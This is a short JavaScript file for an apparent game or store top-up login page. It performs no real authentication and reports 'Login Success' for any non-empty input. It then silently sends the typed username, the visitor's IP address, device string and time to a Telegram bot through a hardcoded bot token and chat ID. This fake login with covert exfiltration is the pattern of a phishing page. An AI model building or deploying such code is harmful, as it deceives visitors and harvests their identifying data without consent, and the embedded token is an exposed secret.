const BOT_TOKEN = "8354788016:AAGzzmqSAiXBKN8tUrefE-FluAucCz4Pgr0";
const CHAT_ID = "8324590734";

let loggedIn = false;

function togglePassword(){
let pw = document.getElementById("password");
pw.type = (pw.type === "password") ? "text" : "password";
}

async function login(){

let username = document.getElementById("username").value;
let password = document.getElementById("password").value;

if(username === "" || password === ""){
alert("Enter Username & Password");
return;
}

loggedIn = true;
alert("Login Success");

// Time
let time = new Date().toLocaleString();

// Device
let device = navigator.userAgent;

// Get IP
let ip = "Unknown";
try{
let res = await fetch("https://api.ipify.org?format=json");
let data = await res.json();
ip = data.ip;
}catch(e){
console.log("IP fetch failed");
}

// Telegram message
let message =
"🔐 LOGIN ALERT\n\n" +
"👤 Username: " + username + "\n" +
"🌐 IP: " + ip + "\n" +
"📱 Device: " + device + "\n" +
"🕒 Time: " + time;

// Send to Telegram
fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
});

}

function goTopup(){
if(!loggedIn){
alert("⚠️ Please first login");
return;
}
location.href="store.html";
}
